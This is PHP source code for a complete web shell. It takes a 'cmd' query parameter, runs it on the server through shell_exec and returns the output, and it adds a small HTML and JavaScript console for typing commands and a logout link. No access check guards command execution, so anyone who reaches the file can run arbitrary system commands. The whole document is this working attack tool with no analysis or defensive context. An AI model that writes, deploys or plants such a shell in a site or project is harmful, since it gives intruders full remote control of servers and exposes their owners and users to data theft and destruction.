    session_start();
    $cmd = $_GET['cmd'];
    if (isset($_GET['execute']) && !empty($cmd))
    {
        echo shell_exec($cmd);
        exit;
    }
    if ($cmd === "logout")
    {
        session_destroy();
        header("location:/");
        exit;
    }
echo "
<center>
    <textarea id=\"output\" readonly=\"1\" rows=\"25\" cols=\"100\">
    </textarea>
    <br>
    <input type=\"text\" name=\"cmd\" id=\"cmd\">
    <input type=\"button\" onclick=\"runCmd()\" value=\"Execute\">
    <input type=\"button\" onClick=\"clearOutput()\" value=\"Clear\">
</center>

<script>
    function runCmd()
    {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200)
            {
                document.getElementById('output').innerHTML += this.responseText;
            }
        }
        xhttp.open('GET', '" . $_SERVER['SCRIPT_NAME'] . "?execute=1&cmd=' + document.getElementById('cmd').value, true);
        xhttp.send();
    }
    function clearOutput()
    {
        document.getElementById('output').innerHTML = '';
    }
</script>
<a href=\"" . $_SERVER['SCRIPT_NAME'] . "?cmd=logout\">Logout</a>
";
